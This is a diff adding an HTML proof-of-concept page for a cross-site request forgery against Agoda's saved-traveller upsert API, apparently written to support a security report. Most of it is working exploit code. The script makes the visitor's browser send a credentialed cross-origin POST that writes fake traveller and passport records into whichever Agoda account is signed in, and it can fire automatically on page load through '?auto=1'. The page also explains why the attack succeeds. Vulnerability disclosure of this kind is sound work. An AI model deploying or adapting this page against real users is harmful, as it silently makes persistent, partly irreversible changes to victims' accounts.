@@ -1,0 +1,188 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>CSRF PoC - Agoda saved-traveller/upsert (authorized validation)</title>
+<style>
+  body{font:14px/1.5 system-ui,"Segoe UI",Arial,sans-serif;margin:24px auto;max-width:920px;padding:0 16px;color:#111}
+  h1{font-size:18px;margin:0 0 8px}
+  code,textarea,input{font:12px/1.45 ui-monospace,Consolas,"Courier New",monospace}
+  .box{border:1px solid #d9d9d9;border-radius:8px;padding:12px 14px;margin:14px 0;background:#fafafa}
+  .warn{color:#7a4b00;background:#fff8e6;border-color:#f0d9a8}
+  .ok{color:#0a7a25}.err{color:#b00020}
+  textarea{width:100%;min-height:230px;box-sizing:border-box;white-space:pre;overflow:auto}
+  input[type=text]{width:100%;box-sizing:border-box;max-width:760px}
+  input#tid{width:220px}
+  button{font:inherit;padding:7px 13px;margin:6px 8px 0 0;cursor:pointer}
+  pre{white-space:pre-wrap;word-break:break-word;margin:8px 0 0}
+  small{color:#555}
+  table{border-collapse:collapse;margin-top:6px}
+  td,th{border:1px solid #ddd;padding:3px 8px;font-size:12px;text-align:left}
+</style>
+</head>
+<body>
+
+<h1>CSRF PoC &mdash; Agoda <code>POST /api/booking-bff/saved-traveller/upsert</code></h1>
+
+<div class="box warn">
+  <b>Authorized security testing only.</b><br>
+  This page performs a cross-origin <code>text/plain</code> POST that the browser sends with the
+  <b>currently signed-in Agoda session</b> of whoever loads it. Load it only in a browser signed in to
+  a test account you own. The write persists server-side and is not fully reversible
+  (<code>passportCountryId</code> / <code>passportExpiryDate</code> cannot be cleared). Do not load it
+  while signed in to a real account.
+</div>
+
+<div class="box">
+  <b>Target</b><br>
+  <input id="url" type="text" value="https://www.agoda.com/api/booking-bff/saved-traveller/upsert">
+  <br><br>
+  <b>Mode</b>
+  <small>(URL parameters: no <code>tid</code> = create with <code>travellerId</code> omitted (default);
+  <code>?mode=create</code> = create with <code>travellerId: null</code>;
+  <code>?tid=&lt;id&gt;</code> = update that record)</small><br>
+  <label><input type="radio" name="mode" value="omit" checked> create, <code>travellerId</code> omitted</label>
+  <label><input type="radio" name="mode" value="create"> create, <code>travellerId: null</code></label>
+  <label><input type="radio" name="mode" value="update"> update <code>travellerId =</code>
+    <input id="tid" type="text" placeholder="id to update"></label>
+  <br>
+  <b>Request body</b> <small>(prefilled with the object from the report; edit if your captured request differs)</small><br>
+  <textarea id="body" spellcheck="false"></textarea>
+  <div>
+    <button id="send">Send cross-origin POST (sendBeacon)</button>
+    <button id="sendFetch">Send with fetch (credentials: include, no-cors)</button>
+    <button id="regen">Rebuild body from template</button>
+  </div>
+</div>
+
+<div class="box">
+  <b>Log</b>
+  <pre id="out"></pre>
+</div>
+
+<div class="box">
+  <b>How to verify (test account)</b>
+  <ol>
+    <li>In the signed-in Agoda tab, call <code>POST /api/booking-bff/saved-traveller/fetch</code> and note the traveller list (ids, first name, count).</li>
+    <li>Load this page and click <b>Send</b> (<code>?auto=1</code> sends on load with no interaction).</li>
+    <li>Call <code>saved-traveller/fetch</code> again. A create-mode run adds one traveller carrying the payload values; an update-mode run changes only the record whose <code>travellerId</code> is in the URL.</li>
+  </ol>
+  <small>
+  Note: <code>upsert</code> treats name + email + passport as a natural key. If the payload matches an
+  existing record, the server updates that record instead of adding a new one (no count change). That is
+  why the body carries a fresh random suffix on every rebuild - a repeated payload can otherwise look
+  like nothing happened even though the request was accepted.
+  </small>
+  <small>
+  No CSRF token is present, <code>text/plain</code> is CORS-safelisted so no preflight occurs, and the
+  <code>agoda.user.03</code> session cookie is issued with <code>SameSite=None; Secure; Domain=.agoda.com</code>,
+  so the browser attaches it to this cross-site request. <code>sendBeacon</code> returns only <code>true</code>
+  (queued); the response is not readable cross-origin and must be verified with <code>saved-traveller/fetch</code>.
+  </small>
+</div>
+
+<script>
+(function () {
+  "use strict";
+
+  var q = new URLSearchParams(location.search);
+  var tid = q.get("tid") || "";
+  var modeParam = q.get("mode");
+
+  function pickMode() {
+    var el = document.querySelector("input[name=mode]:checked");
+    return el ? el.value : "create";
+  }
+  function setMode(m) {
+    var el = document.querySelector("input[name=mode][value=" + m + "]");
+    if (el) el.checked = true;
+  }
+  // Fresh identity values on every rebuild: the upsert matches an existing record by
+  // name/email/passport, so a repeated payload would update instead of create.
+  function suffix() {
+    var L = "", D = "";
+    for (var i = 0; i < 4; i++) {
+      L += String.fromCharCode(65 + Math.floor(Math.random() * 26));
+      D += String(Math.floor(Math.random() * 10));
+    }
+    return { letters: L, email: "csrf-poc-" + L.toLowerCase() + "@example.invalid", passport: "CSRFP" + D };
+  }
+  function template(mode, id) {
+    var u = suffix();
+    var t = {
+      travellerId: mode === "update" ? id : (mode === "create" ? null : undefined),
+      firstName: "CSRFTEST" + u.letters,
+      middleName: "",
+      lastName: "PROOF",
+      nativeFirstName: "",
+      nativeLastName: "",
+      birthDate: "1988-08-08T00:00:00.000Z",
+      nationalityId: 1,
+      gender: "male",
+      passportNumber: u.passport,
+      passportCountryId: 1,
+      passportExpiryDate: "2037-07-07T00:00:00.000Z",
+      knownTravellerNumber: null,
+      frequentFlyer: [],
+      countryOfResidence: null,
+      jpPrefecture: null,
+      phoneNumber: "+10000000000",
+      email: u.email
+    };
+    if (mode === "omit") delete t.travellerId;
+    return JSON.stringify({ travellers: [{ traveller: t }] }, null, 2);
+  }
+
+  var out = document.getElementById("out");
+  function log(msg) { out.textContent += msg + "\n"; }
+
+  function rebuild() {
+    document.getElementById("body").value = template(pickMode(), document.getElementById("tid").value || tid);
+  }
+
+  document.getElementById("tid").value = tid;
+  if (tid) setMode("update");
+  else if (modeParam) setMode(modeParam);
+  rebuild();
+
+  document.getElementById("regen").onclick = rebuild;
+  Array.prototype.forEach.call(document.querySelectorAll("input[name=mode]"), function (r) {
+    r.addEventListener("change", rebuild);
+  });
+
+  function send() {
+    var url = document.getElementById("url").value.trim();
+    var body = document.getElementById("body").value;
+    log("[" + new Date().toISOString() + "] POST " + url);
+    log("Origin: " + location.origin + "  |  Content-Type: text/plain;charset=UTF-8 (sendBeacon)");
+    log("Body: " + body.replace(/\s+/g, " "));
+    var queued = navigator.sendBeacon(url, body);
+    log(queued ? "sendBeacon() queued the request (true)." : "sendBeacon() refused (false).");
+    log("Response is opaque cross-origin - verify with saved-traveller/fetch in the Agoda tab.");
+  }
+
+  document.getElementById("send").onclick = send;
+
+  document.getElementById("sendFetch").onclick = function () {
+    var url = document.getElementById("url").value.trim();
+    var body = document.getElementById("body").value;
+    log("[" + new Date().toISOString() + "] fetch(POST, mode=no-cors, credentials=include) " + url);
+    fetch(url, {
+      method: "POST",
+      mode: "no-cors",
+      credentials: "include",
+      headers: { "content-type": "text/plain" },
+      body: body
+    }).then(function () {
+      log("fetch request sent (opaque response).");
+    }).catch(function (e) {
+      log("fetch failed: " + e);
+    });
+  };
+
+  if (q.get("auto") === "1") setTimeout(send, 150);
+})();
+</script>
+</body>
+</html>
